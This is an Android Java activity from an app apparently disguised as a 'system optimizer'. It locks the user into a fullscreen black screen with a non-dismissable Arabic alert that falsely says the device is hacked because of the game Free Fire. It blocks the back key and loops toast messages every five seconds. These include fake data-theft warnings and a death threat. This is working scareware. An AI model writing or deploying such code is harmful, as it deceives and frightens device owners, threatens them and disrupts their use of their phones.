package com.example.systemoptimizer;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.KeyEvent;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Toast;

public class BlackScreenActivity extends Activity {

    private final Handler handler = new Handler(Looper.getMainLooper());
    private Runnable repeatingMessages;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // جعل الشاشة ملئة الشاشة وسوداء
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

        // تعيين خلفية سوداء
        setContentView(R.layout.black_screen_layout);

        // منع الخروج من الشاشة
        final AlertDialog.Builder alertDialog = new AlertDialog.Builder(this)
                .setTitle("تحذير أمني")
                .setMessage("تم اختراق جهازك! استخدام فري فاير يعرض بياناتك الشخصية للخطر. قم بإلغاء تثبيت اللعبة فوراً لحماية نفسك.")
                .setCancelable(false)
                .setPositiveButton("موافق", new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int id) {
                        // لا تفعل شيئاً عند الضغط على موافق
                    }
                });

        alertDialog.show();

        // منع الضغط على زر الرجوع
        alertDialog.setOnKeyListener(new DialogInterface.OnKeyListener() {
            @Override
            public boolean onKey(DialogInterface dialog, int keyCode, KeyEvent event) {
                return keyCode == KeyEvent.KEYCODE_BACK;
            }
        });

        // عرض رسائل متكررة
        showRepeatingMessages();
    }

    private void showRepeatingMessages() {
        final String[] messages = {
                "فري فاير يسرق بياناتك الشخصية!",
                "تم اختراق حسابك في فري فاير!",
                "اللعب المستمر لفري فاير يضر بصحتك!",
                "أنا سأقتلك... فري فاير!",
                "فري فاير يسبب إدماناً خطيراً!",
                "تم تتبع استخدامك لفري فاير!",
                "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$"
        };

        repeatingMessages = new Runnable() {
            int i = 0;

            @Override
            public void run() {
                Toast.makeText(BlackScreenActivity.this, messages[i], Toast.LENGTH_LONG).show();
                i = (i + 1) % messages.length;
                handler.postDelayed(this, 5000);
            }
        };

        handler.post(repeatingMessages);
    }

    @Override
    protected void onDestroy() {
        handler.removeCallbacksAndMessages(null);
        super.onDestroy();
    }
}